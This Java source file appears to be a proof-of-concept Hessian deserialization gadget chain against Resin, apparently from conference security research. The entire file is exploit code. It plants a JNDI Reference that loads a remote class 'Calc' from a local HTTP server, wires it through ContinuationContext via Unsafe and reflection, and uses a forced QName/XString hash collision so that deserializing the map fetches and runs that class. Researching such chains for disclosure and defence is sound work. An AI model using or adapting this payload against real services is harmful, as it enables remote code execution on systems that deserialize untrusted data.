package com.test.gadget;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.caucho.naming.QName;
import com.sun.org.apache.xpath.internal.objects.XString;
import tools.HessianTools;
import tools.ReflectTools;
import tools.UnsafeTools;

import javax.naming.CannotProceedException;
import javax.naming.Context;
import javax.naming.Reference;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Hashtable;

import static com.test.gadget.blackhat2025.XStringFSB2toString.unhash;

public class ResinGadget {
    public static void main(String[] args) throws Exception {
        Object object = getObject();
        byte[] bytes = HessianTools.hessian2Ser2bytes(object);
        HessianTools.hessian2Deser(bytes);
    }

    public static Object getObject() throws Exception {
        String refAddr = "http://127.0.0.1:8000/";
        String refClassName = "Calc";

        Reference ref = new Reference(refClassName, refClassName, refAddr);

        Object cannotProceedException = Class.forName("javax.naming.CannotProceedException").getDeclaredConstructor().newInstance();
        ReflectTools.setFieldValue(cannotProceedException, "resolvedObj", ref);

        Class<?> contiC = Class.forName("javax.naming.spi.ContinuationContext");
        Context continuationContext = (Context) UnsafeTools.getObjectByUnsafe(contiC);
        ReflectTools.setFieldValue(continuationContext, "cpe", cannotProceedException);
        ReflectTools.setFieldValue(continuationContext, "env", new Hashtable());

        // 创建QName
        QName qName = new QName(continuationContext, "aaa", "bbb");
        // 实现hash碰撞
        String str = unhash(qName.hashCode());
        // 创建Xtring
        XString xString = new XString(str);

        // 创建HashMap
        HashMap<Object, Object> finalMap = ReflectTools.makeMap(qName, xString);

        return finalMap;
    }
}
